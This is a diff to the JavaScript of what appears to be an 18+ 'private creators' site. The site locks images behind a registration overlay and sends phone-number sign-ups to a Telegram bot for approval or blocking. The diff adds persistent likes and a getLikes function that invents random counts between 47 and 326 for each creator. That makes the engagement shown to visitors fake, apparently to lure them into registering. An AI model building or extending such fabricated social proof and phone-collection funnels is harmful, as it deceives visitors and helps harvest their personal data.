@@ -9,8 +9,12 @@ const modalTitle=document.getElementById('modalTitle');
 let isLogin=false;
 let currentUser=JSON.parse(localStorage.getItem('ch_user_v2')||'null');
 localStorage.removeItem('ch_user');
-let likes={};
+let likes=JSON.parse(localStorage.getItem('ch_likes')||'{}');
 let comments={};
+let liked=JSON.parse(localStorage.getItem('ch_liked')||'{}');
+function getLikes(i){ if(likes[i]==null) likes[i]=47+Math.floor(Math.random()*280); return likes[i]; }
+function saveLikes(){ localStorage.setItem('ch_likes',JSON.stringify(likes)); localStorage.setItem('ch_liked',JSON.stringify(liked)); fetch('/api/likes',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({likes,liked})}).catch(()=>{}); }
+fetch('/api/likes').then(r=>r.json()).then(d=>{ if(d.likes) likes=d.likes; if(d.liked) liked=d.liked; render(); }).catch(()=>{});
 function fmt(ph){ let p=ph.replace(/\D/g,''); if(p.length===9) p='0'+p; return p.replace(/(\d{2})(?=\d)/g,'$1 ').trim(); }
 function sendTelegram(msg, pendingId){
   const kb={inline_keyboard:[[{text:'✅ Valider',callback_data:'approve_'+pendingId},{text:'❌ Refuser',callback_data:'reject_'+pendingId}],[{text:'🚫 Bloquer numéro',callback_data:'block_'+pendingId}]]};
@@ -32,7 +36,7 @@ function render(){
       <img src="${src}" loading="lazy">
       <div class="card-overlay"><div style="text-align:center"><div class="lock-mini">🔒</div><div style="font-size:8px;font-weight:900;letter-spacing:1px;margin-top:6px;color:#fff">INSCRIPTION REQUISE</div></div></div>
       <small>🔒 PRIVÉ</small>
-      <div class="meta"><b>@creator${i+1}</b> · ❤️ ${likes[i]||Math.floor(Math.random()*200)} · 18+</div>
+      <div class="meta"><b>@creator${i+1}</b> · ❤️ ${getLikes(i)} · 18+</div>
     `;
     card.onclick=()=>{
       const isAd=localStorage.getItem('ch_admin_sess')==='1';
@@ -186,15 +190,26 @@ let activeIdx=0;
 function openLight(idx,src){
   activeIdx=idx;
   document.getElementById('lightImg').src=src;
-  document.getElementById('likeCount').textContent=likes[idx]||0;
+  document.getElementById('likeCount').textContent=getLikes(idx);
+  const key=(currentUser?.phone||'anon')+'_'+idx;
+  const btn=document.getElementById('likeBtn');
+  btn.disabled=!!liked[key];
+  btn.style.opacity=liked[key]?'0.5':'1';
+  btn.innerHTML= liked[key] ? '❤️ Liké' : `❤️ <span id="likeCount">${getLikes(idx)}</span>`;
   renderComments();
   lightbox.classList.remove('hidden');
 }
 document.getElementById('closeLight').onclick=()=> lightbox.classList.add('hidden');
 lightbox.onclick=e=>{ if(e.target===lightbox) lightbox.classList.add('hidden'); };
 document.getElementById('likeBtn').onclick=()=>{
-  likes[activeIdx]=(likes[activeIdx]||0)+1;
+  const key=(currentUser?.phone||'anon')+'_'+activeIdx;
+  if(liked[key]) return;
+  liked[key]=1;
+  likes[activeIdx]=getLikes(activeIdx)+1;
+  saveLikes();
   document.getElementById('likeCount').textContent=likes[activeIdx];
+  const btn=document.getElementById('likeBtn');
+  btn.disabled=true; btn.style.opacity='0.5'; btn.innerHTML='❤️ Liké';
   render();
 };
 document.getElementById('sendComment').onclick=()=>{
